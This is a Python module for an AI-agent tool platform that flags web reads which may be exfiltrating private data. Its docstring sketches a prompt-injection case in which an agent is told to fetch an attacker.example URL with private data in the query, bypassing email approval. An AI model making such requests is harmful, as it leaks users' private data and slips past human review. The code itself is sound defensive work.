"""Data-exfiltration guard for reads (Part 10, step 0a).

A read can leak data: a prompt-injected agent that has seen private rows (sql_query, file_read, private memory) or
untrusted content can be told to fetch `https://attacker.example/?d=<your data>`. No email is sent, so the
external_write approval never triggers. Rule, enforced in code for web_fetch and http_request GET in an attempt
that is tainted OR private: the URL runs without a human only if its host is in the tool's read allowlist, or the
exact URL (normalized, query included) was already seen as data before (a search result, a fetched page, the task
input or an upstream output). Such attempts also get length caps, and query values carrying text from an earlier
private result are flagged.
"""

from __future__ import annotations

import fnmatch
import json
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlsplit

from app.tools.sources import normalize_url

URL_RE = re.compile(r"https?://[^\s\"'<>)\]]+")
TOKEN_RE = re.compile(r"[A-Za-z0-9]{6,}")


@dataclass
class ExfilContext:
    provenance: set[str] = field(default_factory=set)  # normalized URLs seen as data
    private_tokens: set[str] = field(default_factory=set)  # lowercase tokens from private results
    read_allowlist: list[str] = field(default_factory=list)
    max_url_length: int = 500
    max_query_chars: int = 200


def urls_in(value: Any) -> set[str]:
    text = value if isinstance(value, str) else json.dumps(value, default=str)
    return {normalize_url(u.rstrip(".,;")) for u in URL_RE.findall(text)}


def tokens_in(value: Any) -> set[str]:
    text = value if isinstance(value, str) else json.dumps(value, default=str)
    return {t.lower() for t in TOKEN_RE.findall(text) if not t.isdigit()}


def _allowlisted(host: str, patterns: list[str]) -> bool:
    host = host.lower().rstrip(".")
    return any(host == p.lower() or (p.startswith("*.") and fnmatch.fnmatch(host, p.lower())) for p in patterns)


def check_read_url(url: str, ctx: ExfilContext) -> str | None:
    """None = may run without a human; otherwise the warning shown on the approval card."""
    parts = urlsplit(url)
    if _allowlisted(parts.hostname or "", ctx.read_allowlist):
        return None
    problems: list[str] = []
    if len(url) > ctx.max_url_length or len(parts.query) > ctx.max_query_chars:
        problems.append(f"the URL is too long for a task holding private or untrusted data ({len(url)} chars, "
                        f"query {len(parts.query)} chars)")
    if normalize_url(url) not in ctx.provenance:
        problems.append("URL not from a trusted source (not in the read allowlist and not seen earlier as a "
                        "search result, fetched page, task input or upstream output)")
    leaked = sorted(t for t in tokens_in(parts.query + " " + parts.path) if t in ctx.private_tokens)
    if leaked:
        problems.append(f"it contains text from an earlier private result ({', '.join(leaked[:5])})")
    if not problems:
        return None
    return f"possible data exfiltration: {'; '.join(problems)}. Full URL: {url}"
